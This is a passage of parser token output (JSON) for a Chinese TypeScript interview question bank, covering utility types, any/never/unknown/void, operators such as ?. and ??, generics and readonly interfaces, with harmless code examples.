包装后的所有属性只读\\n","task":false,"loose":false,"text":"**1：** Readonly: 包装后的所有属性只读","tokens":[{"type":"text","raw":"**1：** Readonly: 包装后的所有属性只读","text":"**1：** Readonly: 包装后的所有属性只读","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Readonly: 包装后的所有属性只读","text":" Readonly: 包装后的所有属性只读","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Pick: 选取部分属性\\n","task":false,"loose":false,"text":"**1：** Pick: 选取部分属性","tokens":[{"type":"text","raw":"**1：** Pick: 选取部分属性","text":"**1：** Pick: 选取部分属性","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Pick: 选取部分属性","text":" Pick: 选取部分属性","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Omit: 去除部分属性\\n","task":false,"loose":false,"text":"**1：** Omit: 去除部分属性","tokens":[{"type":"text","raw":"**1：** Omit: 去除部分属性","text":"**1：** Omit: 去除部分属性","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Omit: 去除部分属性","text":" Omit: 去除部分属性","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Extract: 交集\\n","task":false,"loose":false,"text":"**1：** Extract: 交集","tokens":[{"type":"text","raw":"**1：** Extract: 交集","text":"**1：** Extract: 交集","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Extract: 交集","text":" Extract: 交集","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Exclude: 差集","task":false,"loose":false,"text":"**1：** Exclude: 差集","tokens":[{"type":"text","raw":"**1：** Exclude: 差集","text":"**1：** Exclude: 差集","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Exclude: 差集","text":" Exclude: 差集","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 4. any、never、unknown、null & undefined 和 void 有什么区别？\\n\\n","depth":2,"text":"4. any、never、unknown、null & undefined 和 void 有什么区别？","tokens":[{"type":"text","raw":"4. any、never、unknown、null & undefined 和 void 有什么区别？","text":"4. any、never、unknown、null & undefined 和 void 有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** any: 动态的变量类型（失去了类型检查的作用）\\n- **1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型\\n- **1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型\\n- **1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自\\n- **1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** any: 动态的变量类型（失去了类型检查的作用）\\n","task":false,"loose":false,"text":"**1：** any: 动态的变量类型（失去了类型检查的作用）","tokens":[{"type":"text","raw":"**1：** any: 动态的变量类型（失去了类型检查的作用）","text":"**1：** any: 动态的变量类型（失去了类型检查的作用）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" any: 动态的变量类型（失去了类型检查的作用）","text":" any: 动态的变量类型（失去了类型检查的作用）","escaped":false}]}]},{"type":"list_item","raw":"- **1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型\\n","task":false,"loose":false,"text":"**1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","tokens":[{"type":"text","raw":"**1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","text":"**1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","text":" never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","escaped":false}]}]},{"type":"list_item","raw":"- **1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型\\n","task":false,"loose":false,"text":"**1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","tokens":[{"type":"text","raw":"**1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","text":"**1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","text":" unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型","escaped":false}]}]},{"type":"list_item","raw":"- **1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自\\n","task":false,"loose":false,"text":"**1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","tokens":[{"type":"text","raw":"**1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","text":"**1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","text":" null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自","escaped":false}]}]},{"type":"list_item","raw":"- **1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","task":false,"loose":false,"text":"**1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","tokens":[{"type":"text","raw":"**1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","text":"**1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","text":" void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 5. ?.、??、!、!.、_、** 等符号的含义？\\n\\n","depth":2,"text":"5. ?.、??、!、!.、_、** 等符号的含义？","tokens":[{"type":"text","raw":"5. ?.、??、!、!.、_、** 等符号的含义？","text":"5. ?.、??、!、!.、_、** 等符号的含义？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行\\n- **1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数\\n- **1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined\\n- **1：** !. 在变量名后添加，可以断言排除undefined和null类型\\n- **1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324\\n- **1：** ** 求幂","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行\\n","task":false,"loose":false,"text":"**1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","tokens":[{"type":"text","raw":"**1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","text":"**1：** ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","text":" ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行","escaped":false}]}]},{"type":"list_item","raw":"- **1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数\\n","task":false,"loose":false,"text":"**1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","tokens":[{"type":"text","raw":"**1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","text":"**1：** ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","text":" ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数","escaped":false}]}]},{"type":"list_item","raw":"- **1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined\\n","task":false,"loose":false,"text":"**1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","tokens":[{"type":"text","raw":"**1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","text":"**1：** ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","text":" ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined","escaped":false}]}]},{"type":"list_item","raw":"- **1：** !. 在变量名后添加，可以断言排除undefined和null类型\\n","task":false,"loose":false,"text":"**1：** !. 在变量名后添加，可以断言排除undefined和null类型","tokens":[{"type":"text","raw":"**1：** !. 在变量名后添加，可以断言排除undefined和null类型","text":"**1：** !. 在变量名后添加，可以断言排除undefined和null类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" !. 在变量名后添加，可以断言排除undefined和null类型","text":" !. 在变量名后添加，可以断言排除undefined和null类型","escaped":false}]}]},{"type":"list_item","raw":"- **1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324\\n","task":false,"loose":false,"text":"**1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","tokens":[{"type":"text","raw":"**1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","text":"**1：** _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","text":" _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324","escaped":false}]}]},{"type":"list_item","raw":"- **1：** ** 求幂","task":false,"loose":false,"text":"**1：** ** 求幂","tokens":[{"type":"text","raw":"**1：** ** 求幂","text":"**1：** ** 求幂","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ** 求幂","text":" ** 求幂","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 6. 请解释一下 TypeScript 中的基本数据类型有哪些？\\n\\n","depth":2,"text":"6. 请解释一下 TypeScript 中的基本数据类型有哪些？","tokens":[{"type":"text","raw":"6. 请解释一下 TypeScript 中的基本数据类型有哪些？","text":"6. 请解释一下 TypeScript 中的基本数据类型有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  TypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  TypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","task":false,"loose":false,"text":"**1：**\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","tokens":[{"type":"text","raw":"**1：**\\n\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","text":"**1：**\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","text":"\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 7. 什么是泛型,有什么作用？\\n\\n","depth":2,"text":"7. 什么是泛型,有什么作用？","tokens":[{"type":"text","raw":"7. 什么是泛型,有什么作用？","text":"7. 什么是泛型,有什么作用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","task":false,"loose":false,"text":"**1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","tokens":[{"type":"text","raw":"**1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","text":"**1：** 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","text":" 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"code","raw":"```typescript\\n\\ninterface IResponseData<T>{\\n    code: number;\\n    message?: string;\\n    data: T;\\n}\\n\\n\\ninterface User {\\n  id: number;\\n  name: string;\\n  email: string;\\n}\\n\\n// 使用时传入User类型\\nconst response: IResponseData<User> = {\\n  code: 200,\\n  message: \\"Success\\",\\n  data: {\\n    id: 1,\\n    name: \\"xiaoming\\",\\n    email: \\"xxx@qq.com\\"\\n  }\\n};\\n\\n```","lang":"typescript","text":"\\ninterface IResponseData<T>{\\n    code: number;\\n    message?: string;\\n    data: T;\\n}\\n\\n\\ninterface User {\\n  id: number;\\n  name: string;\\n  email: string;\\n}\\n\\n// 使用时传入User类型\\nconst response: IResponseData<User> = {\\n  code: 200,\\n  message: \\"Success\\",\\n  data: {\\n    id: 1,\\n    name: \\"xiaoming\\",\\n    email: \\"xxx@qq.com\\"\\n  }\\n};\\n"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 8. 如何在 TypeScript 中定义一个只读属性的接口？\\n\\n","depth":2,"text":"8. 如何在 TypeScript 中定义一个只读属性的接口？","tokens":[{"type":"text","raw":"8. 如何在 TypeScript 中定义一个只读属性的接口？","text":"8. 如何在 TypeScript 中定义一个只读属性的接口？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用 readonly 关键字。例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用 readonly 关键字。例如：","task":false,"loose":false,"text":"**1：** 使用 readonly 关键字。例如：","tokens":[{"type":"text","raw":"**1：** 使用 readonly 关键字。例如：","text":"**1：** 使用 readonly 关键字。例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 readonly 关键字。例如：","text":" 使用 readonly 关键字。例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\ninterface Person {\\n  readonly name: string;\\n}\\nlet p: Person = { name: \\"John\\" };\\n// p.name = \\"Doe\\";  // 错误，不能修改只读属性\\n```","lang":"ts","text":"interface Person {\\n  readonly name: string;\\n}\\nlet p: Person = { name: \\"John\\" };\\n// p.name = \\"Doe\\";  // 错误，不能修改只读属性"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. 什么是TypeScript？\\n\\n","depth":2,"text":"9. 什么是TypeScript？","tokens":[{"type":"text","raw":"9. 什么是TypeScript？","text":"9. 什么是TypeScript？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","task":false,"loose":false,"text":"**1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","tokens":[{"type":"text","raw":"**1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","text":"**1：** Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","text":" Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 10. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？\\n\\n","depth":2,"text":"10. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？","tokens":[{"type":"text","raw":"10. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？","text":"10. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 